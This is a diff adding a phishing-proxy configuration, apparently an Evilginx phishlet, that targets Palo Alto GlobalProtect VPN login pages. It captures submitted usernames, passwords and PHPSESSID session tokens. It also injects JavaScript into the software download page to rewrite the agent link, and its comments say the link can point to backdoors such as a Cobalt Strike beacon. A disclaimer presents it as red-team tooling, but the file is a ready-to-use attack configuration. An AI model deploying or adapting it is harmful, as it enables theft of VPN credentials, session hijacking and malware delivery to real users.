@@ -1,0 +1,39 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, IT IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE ALWAYS BE ETHICAL.
+
+# this phishlet allows to intercept the access credentials to the global protect interface (that normally are the VPN access credentials)
+# but also to inject javascript to modify the links in the page, allowing to download backdoors or other software useful during a penetration test
+# or a red team engagement
+
+author: '@lillox'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'subdomainhere', orig_sub: 'subdomainhere', domain: 'domainhere', session: true, is_landing: true}
+sub_filters: []
+auth_tokens:
+  - domain: 'domainhere'
+    keys: ['PHPSESSID']
+auth_urls:
+  - '/global-protect/getsoftwarepage.esp'
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '^passwd$'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'domainhere'
+  path: '/global-protect/login.esp'
+js_inject:
+ - trigger_domains: ["domainhere"]
+   trigger_paths: ["/global-protect/getsoftwarepage.esp"]
+   # as an example, the first link of the agent download page is modified so that an alert appears,
+   # it is obviously possible to modify all the links by pointing them to one's own tools.
+   script: |
+      function modify_links(){
+         document.getElementById('taGetSofewarePage').getElementsByTagName('p')[0].innerHTML="<a href=#win32 onClick=\"alert('CobaltStrike Beacon')\">Download Windows 32 bit GlobalProtect agent</a>"
+      }
+      setTimeout(function(){modify_links();}, 100);
